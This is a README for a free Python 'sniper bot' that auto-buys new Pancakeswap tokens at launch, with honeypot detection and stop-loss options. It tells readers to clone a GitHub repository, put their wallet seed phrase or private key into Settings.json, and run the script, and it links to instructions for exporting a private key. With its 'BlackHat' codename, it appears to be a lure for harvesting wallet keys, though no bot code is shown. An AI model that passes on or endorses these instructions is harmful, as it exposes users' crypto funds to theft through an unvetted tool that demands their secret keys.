# Pancakeswap BSC Sniper Bot web3 with honeypot detector (ANDROID WINDOWS MAC LINUX)

<a href="https://ibb.co/Ct5LxMt"><img src="https://i.ibb.co/VNW6XQN/raderss.jpg" alt="raderss" border="0"></a>

[![Version](https://img.shields.io/badge/Codename-BlackHat-red.svg?maxAge=259200)]()
[![Stage](https://img.shields.io/badge/Release-Stable-brightgreen.svg)]()
[![Build](https://img.shields.io/badge/Supported_OS-ANDROID-orange.svg)]()
[![Available](https://img.shields.io/badge/Available-ANDROID-orange.svg?maxAge=259200)]()
[![Documentation](https://img.shields.io/badge/TOKEN-RADER-red.svg?maxAge=259200)]()
[![Contributions Welcome](https://img.shields.io/badge/Type-FREE-blue.svg?style=flat)]()


## Web3 Pancakeswap Sniper & honeypot detector Take Profit/StopLose bot written in python3, For ANDROID WIN MAC & LINUX

### The first Binance Smart Chain sniper bot with Honeypot checker!  
<a href="https://ibb.co/rZZ7k4T"><img src="https://i.ibb.co/nDDgrzZ/Screenshot-2021-12-23-191501.png" alt="Screenshot-2021-12-23-191501" border="0"></a>


### First SNIPER BOT for ANDROID honeypot detector

<H2>(AUTO BUY TOKEN ON LAUNCH AFTER ADD LIQUIDITY)</H2>
<H3>Sniper bot that watches when taxes/anti buy are removed from a contract, then quick snipes, with honeypot detector, and also keybinding for fair launches</H3>


# Install
First of all, you need install Python3+
Run on Android you need Install [Termux](https://termux.com/)  
```shell
termux: $ pkg install python git
Debian/Ubuntu: $ sudo apt install python3 git make gcc
Windows: Need to install Visual Studio BuildTools & Python3
```

<H2>HOW TO USE</H2>

### Setup your Address and secret key in Settings.json

1. An ethereum/bsc address.
2. Open "Settings.json" (with notepad) on line 2 and 3 add wallet address and phrase or private key.
3. Run python3 sniper.py

(Also you can use phrase key just use space between words)

<H2>How Find Private Key</H2>
https://metamask.zendesk.com/hc/en-us/articles/360015289632-How-to-Export-an-Account-Private-Key


Clone Repo: 

```shell
git clone https://github.com/META-HYDRA/Pancakeswap--TOKEN-RADER--ANDROID-WINDOWS
cd Pancakeswap--TOKEN-RADER--ANDROID-WINDOWS
python sniper.py
```

Install Requirements:  

```python
python -m pip install -r requirements.txt
```  

Start Sniper: 

```python
python Sniper.py -t <TOKEN_ADDRESS> -a <AMOUNT> -tx <TXAMOUNT> -hp -wb <BLOCKS WAIT BEFORE BUY> -tp <TAKE PROFIT IN PERCENT> -sl <STOP LOSE IN PERCENT>
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -a 0.001 -tx 2 -hp  -wb 10 -tp 50
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 --sellonly
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -a 0.001 --buyonly
python Sniper.py -t 0x34faa80fec0233e045ed4737cc152a71e490e2e3 -tsl 10 -nb
```  

all options with infos:  

```python3
*'-t' or '--token', Token for snipe e.g. "-t 0x34faa80fec0233e045ed4737cc152a71e490e2e3"
'-a' or '--amount', float, Amount in Bnb to snipe e.g. "-a 0.1"

'-tx' or '--txamount', how mutch tx you want to send? It split your BNB amount in e.g. "-tx 5"

'-wb' or '--awaitBlocks', default=0, Await Blocks before sending BUY Transaction. e.g. "-ab 50" 

'-hp' or '--honeypot', if you use this Flag, your token get checks if token is honypot before buy!

'-nb' or '--nobuy', No Buy, Skipp buy, if you want to use only TakeProfit/StopLoss/TrailingStopLoss
'-tp' or '--takeprofit', Percentage TakeProfit from your input BNB amount. e.g. "-tp 50" 
'-tsl'or '--trailingstoploss', 'Percentage Trailing-Stop-loss from your first Quote "-tsl 50"

'-so' or '--sellonly', Sell ALL your Tokens from given token address
'-bo' or '--buyonly', Buy Tokens with your given amount

* = require every time its runs!
```

<a href="https://ibb.co/9v4txdp"><img src="https://i.ibb.co/n01CXKw/1200px-Raider-logo-svg.png" alt="1200px-Raider-logo-svg" border="0"></a>

<H3>WHAT IS UNIQUE TOKEN TRADERS</h3>

- Support ANDROID ,Windows 10 ,Linux and Mac OS
- Add uniswap V3 & pancakeswap v2 
- Added multiple DEXs
- Force Buy and Force Sell buttons, when clicked it will buy or sell with your chosen settings (excluding limit price)
- set manual SLIPPAGE 
- set stop-less price
- Speed adjustable
- The program determines the name and decimals of the token automatically



## Trailing-Stop-Loss:
<img src="https://i.ytimg.com/vi/dZFb0-fwqOk/maxresdefault.jpg" height="400">
